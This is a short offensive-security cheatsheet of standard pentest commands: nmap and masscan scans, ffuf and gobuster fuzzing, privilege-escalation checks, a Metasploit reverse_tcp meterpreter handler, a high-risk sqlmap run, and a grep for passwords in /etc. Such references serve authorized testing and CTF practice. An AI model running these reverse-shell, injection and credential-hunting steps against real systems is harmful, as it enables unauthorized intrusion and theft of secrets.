# Offensive Security Cheatsheet 🚀

*"Knowledge is power. Share it wisely." - Unknown*

## 🔍 Scanning & Enumeration

### Nmap

```# Basic TCP scan
nmap -sV -sC -oA scan_results <TARGET_IP>


Masscan

```# Blazing fast scan
masscan -p1-65535 <TARGET_IP> --rate=1000 -e tun0```


🕵️‍♂️ Web Enumeration

FFUF (Web Fuzzing)

```# Directory brute-forcing
ffuf -w /path/to/wordlist -u http://<TARGET>/FUZZ -mc 200 -fs 4242```

```# Vhost discovery
ffuf -w subdomains.txt -u http://<TARGET> -H "Host: FUZZ.<TARGET>" -fs 0```

Gobuster

```gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,html```


🔑 Privilege Escalation
Linux PrivEsc

bash
```# SUID finder
find / -perm -4000 -type f 2>/dev/null```

```# Kernel exploits
uname -a; searchsploit <kernel_version>```

Windows PrivEsc

powershell
```# Service permissions
accesschk.exe /accepteula -uwcqv *```

```# AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated```


🛠️ Exploitation


Metasploit

```# Basic workflow
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
exploit```

SQL Injection

```sqlmap -u "http://site.com/page?id=1" --risk=3 --level=5 --batch```


📦 Post-Exploitation

File Transfers

```# Python HTTP server
python3 -m http.server 8000```

```# SCP download
scp user@target:/path/to/file .```

Credential Hunting

```# Find passwords in files
grep -riE 'password|passwd|cred' /etc/ 2>/dev/null```


📚 Resources

GTFOBins

PayloadsAllTheThings

HackTricks
